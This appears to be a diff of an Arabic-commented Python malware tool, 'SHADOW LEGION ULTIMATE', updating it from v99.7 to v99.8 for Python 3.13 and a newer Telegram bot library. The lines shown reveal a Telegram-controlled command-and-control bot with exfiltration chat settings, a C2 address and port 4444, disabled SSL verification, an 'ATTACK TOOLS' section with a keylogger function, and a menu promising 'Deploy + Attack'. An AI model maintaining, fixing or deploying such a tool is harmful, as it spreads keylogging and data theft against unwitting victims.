@@ -2,18 +2,18 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.7 (FINAL WORKING)
+🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.8 (PYTHON 3.13 FIX)
 ⚔️ جميع أدوات الاختراق + ميزات التخفي + نشر تلقائي على Cloud Run
-📡 يعمل على Railway – حل جذري لجميع الأخطاء السابقة
+📡 يعمل على Railway – دعم Python 3.13 و Telegram Bot 20.8
 """
 
 import os, sys, time, re, json, base64, hashlib, tempfile, glob, subprocess, logging, sqlite3, urllib.parse, socket, platform, shutil, random, datetime
-from threading import Thread  # ✅ حل خطأ Thread
+from threading import Thread
 import queue
 import requests
 import rsa
 
-# ====================== استيراد اختياري للأدوات (مع fallback) ======================
+# ====================== استيراد اختياري للأدوات ======================
 try:
     import cv2
 except ImportError:
@@ -52,7 +52,6 @@ EXFIL_CHAT_ID = os.environ.get("EXFIL_CHAT_ID", "")
 C2_IP = os.environ.get("C2_IP", "127.0.0.1")
 C2_PORT = int(os.environ.get("C2_PORT", 4444))
 
-# حل خطأ 307
 os.environ['WDM_SSL_VERIFY'] = '0'
 os.environ['WDM_LOCAL'] = '1'
 
@@ -356,7 +355,7 @@ def process_queue():
                 processing = False
         time.sleep(2)
 
-# ====================== ATTACK TOOLS (مع fallback للمكتبات) ======================
+# ====================== ATTACK TOOLS ======================
 @anti_fail
 def real_keylogger(duration=45):
     log = "[SHADOW KEYLOGGER v99 (بديل خفيف)]\n"
@@ -495,7 +494,7 @@ async def start(update: Update, context):
         [InlineKeyboardButton("🌍 Change Region", callback_data='change_region')]
     ]
     await update.message.reply_text(
-        "🔥 **SHADOW LEGION ULTIMATE v99.7**\n"
+        "🔥 **SHADOW LEGION ULTIMATE v99.8**\n"
         "📡 Fully Armed – Deploy + Attack\n"
         "أمرك سيدي 👁",
         reply_markup=InlineKeyboardMarkup(keyboard)
@@ -666,7 +665,7 @@ def main():
     app.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
     app.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))
 
-    logger.info("✅ SHADOW LEGION ULTIMATE v99.7 FULLY LOADED")
+    logger.info("✅ SHADOW LEGION ULTIMATE v99.8 FULLY LOADED")
     app.run_polling()
 
 if __name__ == "__main__":
